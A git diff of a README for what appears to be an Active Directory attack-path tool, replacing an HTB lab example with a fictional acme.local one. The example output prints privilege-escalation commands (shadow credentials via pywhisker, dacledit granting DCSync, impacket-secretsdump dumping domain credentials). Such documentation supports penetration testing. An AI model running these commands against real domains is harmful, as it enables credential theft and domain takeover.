@@ -77,35 +77,33 @@ HTML report. The HTML report shows:
 Example console output (best path + summary; full breakdown lives in the HTML report):
 
 ```
-  ✓ SVC-ALFRESCO@HTB.LOCAL → DOMAIN ADMINS@HTB.LOCAL   7 hops, weight 10 [DCSync]
+  ✓ john.doe@acme.local → DOMAIN ADMINS@acme.local   5 hops, weight 8 [DCSync]
 
-    SVC-ALFRESCO@HTB.LOCAL
-      └─[MemberOf]──► SERVICE ACCOUNTS@HTB.LOCAL
-      └─[MemberOf]──► PRIVILEGED IT ACCOUNTS@HTB.LOCAL
-      └─[MemberOf]──► ACCOUNT OPERATORS@HTB.LOCAL
-      └─[GenericAll]──► EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
-      └─[WriteDacl]──► HTB.LOCAL
-      └─[Contains]──► USERS@HTB.LOCAL
-      └─[Contains]──► DOMAIN ADMINS@HTB.LOCAL
+    john.doe@acme.local
+      └─[MemberOf]──► HELPDESK@acme.local
+      └─[GenericWrite]──► svc_backup@acme.local
+      └─[WriteDacl]──► acme.local
+      └─[Contains]──► USERS@acme.local
+      └─[Contains]──► DOMAIN ADMINS@acme.local
 
-    # Step 1: GenericAll on EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL  (as SVC-ALFRESCO@HTB.LOCAL)
-      $ net rpc group addmem 'EXCHANGE WINDOWS PERMISSIONS' 'SVC-ALFRESCO' -U 'HTB.LOCAL/SVC-ALFRESCO%<SRC_PASSWORD>' -S <DC_IP>
-      $ bloodyAD --host <DC_IP> -d HTB.LOCAL -u 'SVC-ALFRESCO' -p '<SRC_PASSWORD>' add groupMember 'EXCHANGE WINDOWS PERMISSIONS' 'SVC-ALFRESCO'
+    # Step 1: GenericWrite on svc_backup@acme.local  (as john.doe@acme.local)
+      $ pywhisker -d acme.local -u 'john.doe' -p '<SRC_PASSWORD>' --target 'svc_backup' --action add --dc-ip <DC_IP>
+      → now operating as: svc_backup@acme.local
 
-    # Step 2: WriteDacl on HTB.LOCAL  (as SVC-ALFRESCO@HTB.LOCAL)
-      $ dacledit.py -action write -rights DCSync -principal 'SVC-ALFRESCO' -target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL/SVC-ALFRESCO:<SRC_PASSWORD>' -dc-ip <DC_IP>
-      $ impacket-secretsdump -just-dc 'HTB.LOCAL/SVC-ALFRESCO:<SRC_PASSWORD>@<DC_IP>'
+    # Step 2: WriteDacl on acme.local  (as svc_backup@acme.local)
+      $ dacledit.py -action write -rights DCSync -principal 'svc_backup' -target-dn 'DC=acme,DC=local' 'acme.local/svc_backup:<SRC_PASSWORD>' -dc-ip <DC_IP>
+      $ impacket-secretsdump -just-dc 'acme.local/svc_backup:<SRC_PASSWORD>@<DC_IP>'
 
     +2 more paths  →  see HTML report
 
-  ◆ Best pivot: FOREST.HTB.LOCAL (Unconstrained delegation, 4 hops onward)
+  ◆ Best pivot: db_admin@acme.local (Kerberoast, 3 hops onward)
 
   ◆ Domain quick-wins:
-      • High-value target (9)
-      • Password not required (3)
-      • AS-REP roast (1)
+      • High-value target (12)
+      • Kerberoast (4)
+      • AS-REP roast (2)
       • Unconstrained delegation (1)
-      • Domain Controller (1)
+      • Domain Controller (2)
     full details + commands  →  see HTML report
 ```
 
